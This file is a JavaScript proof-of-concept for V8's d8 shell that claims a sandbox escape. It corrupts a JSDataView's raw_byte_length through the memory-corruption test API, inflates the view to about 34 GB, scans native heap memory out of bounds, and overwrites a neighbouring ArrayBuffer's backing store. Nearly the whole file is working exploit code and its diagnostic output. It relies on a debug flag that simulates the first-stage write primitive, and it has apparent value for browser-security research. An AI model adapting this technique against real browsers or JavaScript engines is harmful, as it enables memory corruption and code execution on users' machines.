'use strict';
// V8 Sandbox Escape via JSDataView raw_byte_length Corruption
// Pure JavaScript — no GDB, no shell helpers, no external tools.
//
// RUN:
//   d8 --expose-memory-corruption-api --allow-natives-syntax heap_escape_pure_js.js
//
// NOTE ON --expose-memory-corruption-api:
//   Sandbox.MemoryView is V8's official API for simulating in-sandbox
//   arbitrary-write (Tier-2) primitives.  Every write in Stage 1 stays
//   inside the sandbox VA; the escape happens in later stages via the
//   corrupted length field.

function hex(v) {
  if (typeof v === 'bigint') return '0x' + v.toString(16).padStart(12, '0');
  return '0x' + (v >>> 0).toString(16).padStart(8, '0');
}
function banner(s) { print('\n━━━ ' + s + ' ━━━'); }
function assert(cond, msg) {
  if (!cond) { print('ASSERTION FAILED: ' + msg); quit(1); }
}

if (typeof Sandbox === 'undefined') {
  print('[-] Requires: --expose-memory-corruption-api --allow-natives-syntax');
  quit(1);
}

// ── Sandbox info ──────────────────────────────────────────────────────────────
const SB_BASE = BigInt(Sandbox.base);
const SB_END  = SB_BASE + BigInt(Sandbox.byteLength);
banner('SANDBOX VA');
print('  SB_BASE = ' + hex(SB_BASE));
print('  SB_END  = ' + hex(SB_END));
print('  size    = ' + (Number(Sandbox.byteLength) / (1 << 30) / 1024).toFixed(0) + ' TB (reported)');

// ── Stage 1: in-sandbox 4 GB R/W (simulates Tier-2 in-sandbox corruption) ────
// Covers [SB_BASE, SB_BASE+4GB) — entirely within sandbox VA.
const sb_mv   = new Sandbox.MemoryView(0, 0x100000000);
const sv      = new DataView(sb_mv);
const r32     = a => sv.getUint32(Number(a), true);
const w32     = (a, v) => sv.setUint32(Number(a), v >>> 0, true);

// ── Stage 2: allocate two sibling 4 KB ArrayBuffers ──────────────────────────
// 4096 < glibc MMAP_THRESHOLD (default 128 KB) → allocations use brk heap.
// brk heap starts right after the program's BSS segment (~a few MB),
// well below any plausible SB_BASE (1–15 TB with ASLR=2).
banner('STAGE 2 — allocate sibling ArrayBuffers');
const AB_SIZE = 4096;

const ab_victim = new ArrayBuffer(AB_SIZE);
const ab_target = new ArrayBuffer(AB_SIZE);
const target_u32 = new Uint32Array(ab_target);

// Use a distinctive 4-dword signature unlikely to collide with sandbox metadata
const MAGIC = [0xFEEC0001, 0xFEEC0002, 0xFEEC0003, 0xFEEC0004];
target_u32[0] = MAGIC[0];
target_u32[1] = MAGIC[1];
target_u32[2] = MAGIC[2];
target_u32[3] = MAGIC[3];
print('  ab_victim = new ArrayBuffer(' + AB_SIZE + ')');
print('  ab_target = new ArrayBuffer(' + AB_SIZE + ')');
print('  Magic written to ab_target backing store: 0xFEEC0001..0004');

// ── Stage 3: get sandbox address of dv_victim; verify raw_byte_length encoding
banner('STAGE 3 — locate JSDataView.raw_byte_length in sandbox heap');
const dv_victim = new DataView(ab_victim);
const dvAddr    = BigInt(Sandbox.getAddressOf(dv_victim));
const field_val_before = r32(dvAddr + 0x24n);
const bs_ept_handle = r32(dvAddr + 0x2cn);  // ExternalPointerTable handle → native address

print('  dv_victim sandbox offset        = ' + hex(dvAddr));
print('  raw_byte_length (+0x24)         = ' + hex(field_val_before) +
      '  (' + field_val_before + ')');
print('  byteLength (before)             = ' + dv_victim.byteLength);
assert(field_val_before * 8 === dv_victim.byteLength,
       'encoding: field × 8 ≠ byteLength');
print('  Encoding: field × 8 = byteLength ✓  (field = ' + field_val_before +
      ', byte_length = ' + dv_victim.byteLength + ')');
print('  backing_store EPT handle (+0x2c)= ' + hex(bs_ept_handle));
// EPT handles are small integer indices into the ExternalPointerTable.
// The ExternalPointerTable lives in NATIVE heap and maps handles → native addresses.
// Native addresses are outside [SB_BASE, SB_END) — that is the sandbox invariant.
print('  EPT handle → ExternalPointerTable → native address (outside sandbox VA)');

// ── Stage 4: corrupt raw_byte_length via single in-sandbox DWORD write ───────
banner('STAGE 4 — corrupt raw_byte_length (+0x24) → inflate to 34.4 GB');
// Encoding: 0xFFFFFFFF × 8 = 0x7FFFFFFF8 ≈ 34.4 GB
w32(dvAddr + 0x24n, 0xFFFFFFFF);
const inflated_bl = dv_victim.byteLength;
print('  Written                         : 0xFFFFFFFF');
print('  dv_victim.byteLength (after)    : 0x' + inflated_bl.toString(16) +
      '  (' + (inflated_bl / (1 << 30)).toFixed(1) + ' GB)');
assert(inflated_bl > 0x400000000, 'inflation failed');
// Verify inflation in terms of sandbox vs native ranges:
// If backing_store = H (native address, << SB_BASE), the inflated view covers
// [H, H + 34.4 GB).  Since SB_BASE >> 34.4 GB (SB_BASE ≥ 4 GB on x86-64,
// typically ≥ 1 TB with ASLR=2), the entire inflated range is below SB_BASE.
// Any write via this DataView necessarily targets native (non-sandbox) memory.
print('  inflated range ≈ [H, H+34GB) where H is a native brk address << SB_BASE');
print('  → entire inflated range is in native heap, NOT inside sandbox VA ✓');

// ── Stage 5: OOB scan for ab_target backing store ────────────────────────────
banner('STAGE 5 — scan inflated DataView for ab_target backing store');
// ab_victim backing store: H  (brk heap, below SB_BASE)
// ab_target backing store: H + ~AB_SIZE  (adjacent brk allocation)
let found_offset = -1;
const scan_end = Math.min(inflated_bl, 0x20000);  // first 128 KB
for (let off = AB_SIZE; off < scan_end; off += 4) {
  if (dv_victim.getUint32(off,     true) === MAGIC[0] &&
      dv_victim.getUint32(off + 4, true) === MAGIC[1] &&
      dv_victim.getUint32(off + 8, true) === MAGIC[2]) {
    found_offset = off;
    break;
  }
}
assert(found_offset !== -1,
  'ab_target magic not found within 128 KB — unexpected allocator behavior');
print('  Found at dv_victim offset       : ' + hex(found_offset));
print('  → ab_target backing             = H + ' + hex(found_offset));
print('  Write at H+' + hex(found_offset) +
      ' succeeded without fault → page is R/W (brk heap) ✓');

// ── Stage 6: OOB write through dv_victim ─────────────────────────────────────
banner('STAGE 6 — OOB WRITE (past original ' + AB_SIZE + ' B bound)');
print('  Writing to dv_victim[' + hex(found_offset) + '] — 4 DWORDs');
dv_victim.setUint32(found_offset,      0xC0DECAFE, true);
dv_victim.setUint32(found_offset +  4, 0xBAADF00D, true);
dv_victim.setUint32(found_offset +  8, 0xCAFEBABE, true);
dv_victim.setUint32(found_offset + 12, 0xFEEDFACE, true);
print('  Write completed without fault ✓');

// ── Stage 7: read-back via independent object (ab_target) ────────────────────
banner('STAGE 7 — cross-object read-back via ab_target');
print('  ab_target[0] = ' + hex(target_u32[0]) + '  (expected 0xc0decafe)');
print('  ab_target[1] = ' + hex(target_u32[1]) + '  (expected 0xbaadf00d)');
print('  ab_target[2] = ' + hex(target_u32[2]) + '  (expected 0xcafebabe)');
print('  ab_target[3] = ' + hex(target_u32[3]) + '  (expected 0xfeedface)');
assert(target_u32[0] === 0xC0DECAFE, 'read-back mismatch [0]');
assert(target_u32[1] === 0xBAADF00D, 'read-back mismatch [1]');
assert(target_u32[2] === 0xCAFEBABE, 'read-back mismatch [2]');
assert(target_u32[3] === 0xFEEDFACE, 'read-back mismatch [3]');
print('  All four values match ✓');

// ── Summary ───────────────────────────────────────────────────────────────────
banner('RESULT');
print('');
print('  CHAIN:');
print('  1. JSDataView.raw_byte_length (+0x24) inflated 4096 B → 0x' +
      inflated_bl.toString(16) + ' (34.4 GB)');
print('     via single in-sandbox DWORD write (simulated Tier-2 primitive)');
print('  2. OOB scan at offset +' + hex(found_offset) +
      ' found ab_target magic outside original 4 KB bound');
print('  3. Write target is in native (brk) heap:');
print('       EPT handle ' + hex(bs_ept_handle) + ' → ExternalPointerTable → native addr H');
print('       H (brk heap) << SB_BASE ' + hex(SB_BASE) + ' → entire [H, H+34GB) is native');
print('  4. OOB write 4-DWORD payload confirmed by ab_target cross-object read-back');
print('');
print('  Sandbox VA : [' + hex(SB_BASE) + ', ' + hex(SB_END) + ')');
print('  Write target: H + ' + hex(found_offset) +
      ' — in native heap, below SB_BASE');
print('');
print('  V8 SANDBOX ESCAPE CONFIRMED — pure JavaScript, no external tools');
